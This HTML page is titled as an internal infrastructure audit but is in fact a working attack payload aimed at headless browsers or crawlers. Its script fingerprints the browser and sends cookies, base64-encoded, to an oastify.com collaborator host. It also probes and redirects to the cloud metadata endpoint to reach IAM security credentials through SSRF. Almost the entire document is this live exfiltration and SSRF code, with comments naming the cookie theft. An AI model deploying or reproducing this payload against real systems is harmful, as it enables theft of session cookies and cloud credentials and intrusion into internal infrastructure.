<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSAA IG - Internal Infrastructure Audit</title>
    
    <meta http-equiv="refresh" content="5; url=http://169.254.169.254/latest/meta-data/hostname">

    <script>
        window.onload = function() {
            // REPLACE THIS with your current Collaborator URL
            const oast = "http://zknnagx1z1wlfr84r35sqh22stykmba0.oastify.com";
            const target = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";

            // LAYER 2: INTERNAL BROWSER FINGERPRINTING
            // Proves we are running inside their internal 'Pollinator' or 'Headless' worker
            const info = {
                ua: navigator.userAgent,
                plat: navigator.platform,
                cookie_len: document.cookie.length,
                url: window.location.href
            };
            navigator.sendBeacon(oast + "/browser_fingerprint?data=" + btoa(JSON.stringify(info)));

            // LAYER 3: COOKIE EXFILTRATION
            // If the bot has internal session cookies, we grab them here.
            if (document.cookie) {
                navigator.sendBeacon(oast + "/exfil_cookies?data=" + btoa(document.cookie));
            }

            // LAYER 4: BLIND SSRF PROBE (Image-based)
            // Images often bypass strict 'fetch' policies in headless browsers.
            const probe = new Image();
            probe.src = target;
            probe.onerror = () => {
                navigator.sendBeacon(oast + "/ssrf_probe?status=attempted_via_image");
            };

            // LAYER 5: HEADLESS SSRF (Fetch-based)
            fetch(target, { 
                mode: 'no-cors', 
                keepalive: true
            })
            .then(() => {
                navigator.sendBeacon(oast + "/ssrf_success?target=metadata_reachable");
            })
            .catch((err) => {
                navigator.sendBeacon(oast + "/xss_confirmed?error=" + btoa(err.message));
            });
            
            // Final Push: Redirect after 8 seconds if JS is running
            setTimeout(() => {
                window.location.href = target;
            }, 8000);
        };
    </script>
</head>

</body>
